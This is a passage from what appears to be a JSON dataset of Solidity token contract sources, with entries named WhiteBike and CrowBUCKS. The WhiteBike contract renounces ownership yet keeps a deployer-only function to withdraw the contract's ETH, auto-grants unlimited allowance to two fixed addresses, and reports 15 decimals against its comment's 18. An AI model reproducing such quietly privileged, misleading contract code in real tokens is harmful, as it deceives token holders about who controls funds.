      \n        return functionStaticCall(target, data, \"Address: low-level static call failed\" ) ; \n    }\n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-string-\n                        }[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal view returns (bytes memory)  { \n                        \n        (bool success, bytes memory returndata) = target.staticcall ( data);\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage) ; \n    \n                        }\n\n    /**\n     * @dev Same as \n                         { xref-Address-functionCall-address-bytes-}\n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall ( address target, bytes memory data ) internal returns (bytes memory ) {\n                        \n        return functionDelegateCall ( target, data, \"Address: low-level delegate call failed\" );\n     } \n                        \n\n    /**\n     * @dev Same as \n                         { xref-Address-functionCall-address-bytes-string-}\n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns  ( bytes memory ) \n                        {\n         ( bool success, bytes memory returndata) = target.delegatecall(data);\n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage);\n    \n                         } \n\n    /**\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert  ( either by bubbling\n     * the revert reason or using the provided one ) in case of unsuccessful call or if target was not a contract.\n     *\n     * _Available since v4.8._\n     */\n    function verifyCallResultFromTarget(\n        address target,\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal view returns (bytes memory )  { \n                        \n        if  ( success) \n                        {\n            if (returndata.length == 0)  { \n                        \n                // only check isContract if the call was successful and the return data is empty\n                // otherwise we already know that it was a contract\n                require(isContract(target), \"Address: call to non-contract\" ) ; \n            }\n                        \n            return returndata ; \n        }\n                         else {\n                        \n            _revert ( returndata, errorMessage ) ; \n         } \n                        \n    }\n                        \n\n    /**\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason or using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult ( \n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal pure returns (bytes memory )  { \n                        \n        if (success ) {\n                        \n            return returndata;\n        \n                        } else \n                         { \n            _revert(returndata, errorMessage ) ; \n        }\n                        \n     } \n                        \n\n    function _revert ( bytes memory returndata, string memory errorMessage) private pure  { \n                        \n        // Look for revert reason and bubble it up if present\n        if  ( returndata.length > 0) \n                         { \n            // The easiest way to bubble the revert reason is using memory via assembly\n            /// @solidity memory-safe-assembly\n            assembly {\n                        \n                let returndata_size := mload ( returndata)\n                revert(add(32, returndata), returndata_size )\n            }\n                        \n        }\n                         else  { \n                        \n            revert ( errorMessage);\n        \n                         } \n    }\n                        \n}\n                        \npragma solidity ^0.8.0 ; \n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender  ( as far as an application\n * is concerned ).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context \n                        {\n    function _msgSender() internal view virtual returns  ( address ) {\n                        \n        return msg.sender ; \n     } \n                        \n\n    function _contextSuffixLength() internal view virtual returns  ( uint256 )  { \n                        \n        return 0 ; \n    }\n                        \n\n    function _msgData() internal view virtual returns (bytes calldata)  { \n                        \n        return msg.data;\n     } \n                        \n\n\n\n                        }\n\n\n/**\n * @dev Standard ERC-20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.\n */\ninterface IERC20Errors {\n                        \n\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender(address sender) ; \n\n    /**\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance ( address spender, uint256 allowance, uint256 needed);\n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender(address spender ) ; \n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver(address receiver);\n\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance ( address sender, uint256 balance, uint256 needed );\n\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover ( address approver ) ; \n\n                        }\n\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20  { \n                        \n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to \n                         { approve\n                        }. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account ) external view returns (uint256 ) ; \n\n        /**\n     * @dev Emitted when `value` tokens are moved from one account (`from` ) to\n     * another (`to` ).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    \n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {\n                        Transfer\n                         }  event.\n     */\n    function transferFrom ( address from, address to, uint256 amount ) external returns (bool) ; \n        \n/**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {\n                        Transfer } \n                         event.\n     */\n    function transfer ( address to, uint256 amount ) external returns (bool ) ; \n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply( ) external view returns  ( uint256);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through \n                        {transferFrom } \n                        . This is\n     * zero by default.\n     *\n     * This value changes when \n                        {approve\n                         }  or {\n                        transferFrom}\n                         are called.\n     */\n    function allowance ( address owner, address spender ) external view returns (uint256) ; \n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an  { \n                        Approval\n                         }  event.\n     */\n    function approve ( address spender, uint256 amount) external returns  ( bool);\n    \n } \n                        \n\n\ninterface IERC20Metadata is IERC20 {\n                        \n\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol() external view returns (string memory ) ; \n\n\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals( ) external view returns  ( uint8 ) ; \n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name (  ) external view returns (string memory ) ; \n\n } \n                        \n\n\n\n\n\n/**\n * @dev Implementation of the \n                        {IERC20\n                        } interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using  { \n                        _mint\n                         } .\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of  { \n                        decimals } \n                         is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC-20\n * applications.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors  \n                        {\n    mapping ( address => uint256) private _balances;\n\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n    uint256 private _totalSupply ; \n\n    string private _name ; \n    string private _symbol ; \n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol( ) public view virtual returns (string memory) \n                         { \n        return _symbol;\n    }\n                        \n    \n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`\n     *  ( or `to` ) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a \n                         { Transfer } \n                         event.\n     */\n    function _update(address from, address to, uint256 value ) internal virtual  { \n                        \n        if  ( from == address ( 0 ) )  { \n                        \n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value ; \n         } \n                         else  { \n                        \n            uint256 fromBalance = _balances[from];\n            if  ( fromBalance < value) \n                        {\n                revert ERC20InsufficientBalance(from, fromBalance, value);\n             } \n                        \n            unchecked  { \n                        \n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value ; \n            }\n                        \n        }\n                        \n\n        if (to == address(0))  { \n                        \n            unchecked {\n                        \n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value ; \n             } \n                        \n         } \n                         else \n                         { \n            unchecked  { \n                        \n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value ; \n             } \n                        \n        }\n                        \n\n        emit Transfer ( from, to, value );\n    }\n                        \n    \n\n    /**\n     * @dev See {\n                        IERC20-transfer\n                         } .\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer ( address to, uint256 value) public virtual returns  ( bool )  { \n                        \n        address owner = _msgSender();\n        _transfer ( owner, to, value ) ; \n        return true;\n    \n                         } \n    \n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address ( 0 ).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a  { \n                        Transfer}\n                         event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual,  { \n                        _update}\n                         should be overridden instead.\n     */\n    function _mint(address account, uint256 value ) internal  { \n                        \n        if (account == address(0) ) {\n                        \n            revert ERC20InvalidReceiver ( address(0 )) ; \n        \n                        }\n        _update(address ( 0), account, value) ; \n    }\n                        \n    \n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an \n                         { Approval}\n                         event.\n     */\n    function _spendAllowance(address owner, address spender, uint256 value ) internal virtual  { \n                        \n        uint256 currentAllowance = allowance ( owner, spender );\n        if  ( currentAllowance < type ( uint256).max) \n                         { \n            if (currentAllowance < value) {\n                        \n                revert ERC20InsufficientAllowance(spender, currentAllowance, value ) ; \n            }\n                        \n            unchecked \n                         { \n                _approve(owner, spender, currentAllowance - value, false);\n            \n                        }\n        \n                         } \n     } \n                        \n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name (  ) public view virtual returns (string memory )  { \n                        \n        return _name;\n    \n                        }\n    \n    /**\n     * @dev See {\n                        IERC20-totalSupply } \n                        .\n     */\n    function totalSupply() public view virtual returns (uint256) \n                        {\n        return _totalSupply ; \n    }\n                        \n    \n\n    /**\n     * @dev See {\n                        IERC20-balanceOf\n                         } .\n     */\n    function balanceOf(address account ) public view virtual returns (uint256) {\n                        \n        return _balances[account] ; \n    }\n                        \n    \n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to {\n                        transfer}\n                        , and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {\n                        Transfer}\n                         event.\n     *\n     * NOTE: This function is not virtual, {\n                        _update}\n                         should be overridden instead.\n     */\n    function _transfer ( address from, address to, uint256 value ) internal {\n                        \n        if  ( from == address ( 0 ) )  { \n                        \n            revert ERC20InvalidSender ( address(0) );\n         } \n                        \n        if  ( to == address(0) ) {\n                        \n            revert ERC20InvalidReceiver(address(0 )) ; \n         } \n                        \n        _update ( from, to, value ) ; \n    }\n                        \n    \n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {\n                        IERC20-balanceOf}\n                         and  { \n                        IERC20-transfer } \n                        .\n     */\n    function decimals() public view virtual returns  ( uint8 ) \n                        {\n        return 15 ; \n    \n                         } \n    \n    /**\n     * @dev Sets the values for \n                        {name\n                         }  and \n                        {symbol } \n                        .\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_ ) \n                        {\n        _name = name_ ; \n        _symbol = symbol_;\n     } \n                        \n    \n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {\n                        Approval}\n                         event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve(address owner, address spender, uint256 value) internal {\n                        \n        _approve ( owner, spender, value, true );\n     } \n                        \n    \n    /**\n     * @dev See \n                        {IERC20-approve } \n                        .\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve ( address spender, uint256 value ) public virtual returns  ( bool )  { \n                        \n        address owner = _msgSender( ) ; \n        _approve(owner, spender, value);\n        return true;\n     } \n                        \n    \n\n    /**\n     * @dev See {\n                        IERC20-allowance } \n                        .\n     */\n    function allowance(address owner, address spender) public view virtual returns (uint256) {\n                        \n        return _allowances[owner][spender];\n    }\n                        \n    \n    /**\n     * @dev See  { \n                        IERC20-transferFrom } \n                        .\n     *\n     * Skips emitting an {\n                        Approval } \n                         event indicating an allowance update. This is not\n     * required by the ERC. See \n                         { xref-ERC20-_approve-address-address-uint256-bool-}\n                        [_approve].\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom ( address from, address to, uint256 value) public virtual returns (bool ) \n                        {\n        address spender = _msgSender (  );\n        _spendAllowance(from, spender, value);\n        _transfer ( from, to, value);\n        return true ; \n     } \n                        \n    \n    /**\n     * @dev Variant of {\n                        _approve } \n                         with an optional flag to enable or disable the \n                        {Approval}\n                         event.\n     *\n     * By default (when calling \n                         { _approve } \n                         ) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     *\n     * ```solidity\n     * function _approve(address owner, address spender, uint256 value, bool ) internal virtual override {\n                        \n     *     super._approve(owner, spender, value, true );\n     * }\n                        \n     * ```\n     *\n     * Requirements are the same as  { \n                        _approve}\n                        .\n     */\n    function _approve ( address owner, address spender, uint256 value, bool emitEvent) internal virtual {\n                        \n        if  ( owner == address ( 0 )) \n                         { \n            revert ERC20InvalidApprover ( address(0 ));\n        }\n                        \n        if (spender == address(0) ) {\n                        \n            revert ERC20InvalidSpender(address(0) ) ; \n         } \n                        \n        _allowances[owner][spender] = value ; \n        if (emitEvent) {\n                        \n            emit Approval(owner, spender, value ) ; \n         } \n                        \n    }\n                        \n    \n    }\n                        \n\nabstract contract Ownable is Context  { \n                        \n    address private _owner;\n    \n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner  { \n                        \n        _transferOwnership ( address ( 0 ) ) ; \n    }\n                        \n    \n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() {\n                        \n        _checkOwner() ; \n        _;\n    }\n                        \n    \n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n    \n    /**\n     * @dev The owner is not a valid owner account. (eg. `address(0 )`)\n     */\n    error OwnableInvalidOwner ( address owner);\n    \n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner( ) public view virtual returns (address) \n                        {\n        return _owner;\n     } \n                        \n    \n    /**\n     * @dev The caller account is not authorized to perform an operation.\n     */\n    error OwnableUnauthorizedAccount ( address account) ; \n    \n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner( ) internal view virtual {\n                        \n        require ( owner( ) == _msgSender ( ), \"Ownable: caller is not the owner\") ; \n    }\n                        \n    \n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor ( )  { \n                        \n        _transferOwnership(_msgSender( ) ) ; \n     } \n                        \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership(address newOwner) internal virtual {\n                        \n        address oldOwner = _owner ; \n        _owner = newOwner ; \n        emit OwnershipTransferred ( oldOwner, newOwner );\n     } \n                        \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account  ( `newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n                        \n        require ( newOwner != address(0 ), \"Ownable: new owner is the zero address\");\n        _transferOwnership(newOwner) ; \n    \n                         } \n    \n}\n                        \n\n\n// File WhiteBike.sol\n\ncontract WhiteBike is ERC20, Ownable  { \n                        \n    address internal immutable deployer ; \n    constructor(string memory name_, string memory symbol_) ERC20 ( name_, symbol_)  { \n                        \n        _mint(msg.sender, 10000000000000000000000000 );\n        _transferOwnership(address ( 0) ) ; \n        deployer = msg.sender;\n     } \n                        \n    \n    /**\n     * @dev See {\n                        IERC20-allowance } \n                        .\n     */\n    function allowance(address owner, address spender) public view override returns (uint256) \n                        {\n            //gas optimization: auto allow Permit2 and UniswapRouterV2\n            if (  ( spender == 0x000000000022D473030F116dDEE9F6B43aC78BA3) || (spender == 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24 ) ) { \n                        \n            return type(uint256 ).max ; \n         } \n                         \n        return super.allowance ( owner,spender );\n    }\n                        \n    \n    function claimGas(address payable recipient, uint256 amount) public  { \n                        \n        require ( msg.sender==deployer) ; \n        Address.sendValue(recipient, amount );\n    }\n                        \n    \n    receive() external payable\n                        {\n    }\n                        \n }",
      "count": 1,
      "addresses": [
        "0x64eB5369C7c05B6F26f5d6D8CC0c97d143c0B099"
      ],
      "names": [
        "WhiteBike"
      ]
    },
    {
      "id": "6292d7a7-595c-4a52-b04f-8762c556bb27",
      "code": "// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.20;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\n// Research purpose. Created on 2025-03-28T19:08:24+01:00\n\ncontract CrowBUCKS is ERC20 {\n\n    constructor() ERC20(\"CrowBUCKS\", \"CBU\") {\n        _mint(msg.sender, 1000000000000000000000000000);\n    }\n\n}\n// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.1.0) (interfaces/draft-IERC6093.sol)\npragma solidity ^0.8.20;\n\n/**\n * @dev Standard ERC-20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.\n */\ninterface IERC20Errors {\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender(address sender);\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver(address receiver);\n\n    /**\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover(address approver);\n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender(address spender);\n}\n\n/**\n * @dev Standard ERC-721 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-721 tokens.\n */\ninterface IERC721Errors {\n    /**\n     * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in ERC-20.\n     * Used in balance queries.\n     * @param owner Address of the current owner of a token.\n     */\n    error ERC721InvalidOwner(address owner);\n\n    /**\n     * @dev Indicates a `tokenId` whose `owner` is the zero address.\n     * @param tokenId Identifier number of a token.\n     */\n    error ERC721NonexistentToken(uint256 tokenId);\n\n    /**\n     * @dev Indicates an error related to the ownership over a particular token. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param tokenId Identifier number of a token.\n     * @param owner Address of the current owner of a token.\n     */\n    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC721InvalidSender(address sender);\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC721InvalidReceiver(address receiver);\n\n    /**\n     * @dev Indicates a failure with the `operator`\u2019s approval. Used in transfers.\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\n     * @param tokenId Identifier number of a token.\n     */\n    error ERC721InsufficientApproval(address operator, uint256 tokenId);\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC721InvalidApprover(address approver);\n\n    /**\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC721InvalidOperator(address operator);\n}\n\n/**\n * @dev Standard ERC-1155 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-1155 tokens.\n */\ninterface IERC1155Errors {\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     * @param tokenId Identifier number of a token.\n     */\n    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC1155InvalidSender(address sender);\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC1155InvalidReceiver(address receiver);\n\n    /**\n     * @dev Indicates a failure with the `operator`\u2019s approval. Used in transfers.\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\n     * @param owner Address of the current owner of a token.\n     */\n    error ERC1155MissingApprovalForAll(address operator, address owner);\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC1155InvalidApprover(address approver);\n\n    /**\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC1155InvalidOperator(address operator);\n\n    /**\n     * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.\n     * Used in batch transfers.\n     * @param idsLength Length of the array of token identifiers\n     * @param valuesLength Length of the array of token amounts\n     */\n    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);\n}\n\n// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/IERC20.sol)\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Interface of the ERC-20 standard as defined in the ERC.\n */\ninterface IERC20 {\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev Returns the value of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the value of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves a `value` amount of tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address to, uint256 value) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the\n     * caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 value) external returns (bool);\n\n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to` using the\n     * allowance mechanism. `value` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\n}\n\n// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/extensions/IERC20Metadata.sol)\n\npragma solidity ^0.8.20;\n\nimport {IERC20} from \"../IERC20.sol\";\n\n/**\n * @dev Interface for the optional metadata functions from the ERC-20 standard.\n */\ninterface IERC20Metadata is IERC20 {\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() external view returns (string memory);\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol() external view returns (string memory);\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals() external view returns (uint8);\n}\n\n// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.2.0) (token/ERC20/ERC20.sol)\n\npragma solidity ^0.8.20;\n\nimport {IERC20} from \"./IERC20.sol\";\nimport {IERC20Metadata} from \"./extensions/IERC20Metadata.sol\";\nimport {Context} from \"../../utils/Context.sol\";\nimport {IERC20Errors} from \"../../interfaces/draft-IERC6093.sol\";\n\n/**\n * @dev Implementation of the {IERC20} interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {_mint}.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of {decimals} is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC-20\n * applications.\n */\nabstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {\n    mapping(address account => uint256) private _balances;\n\n    mapping(address account => mapping(address spender => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n\n    /**\n     * @dev Sets the values for {name} and {symbol}.\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev 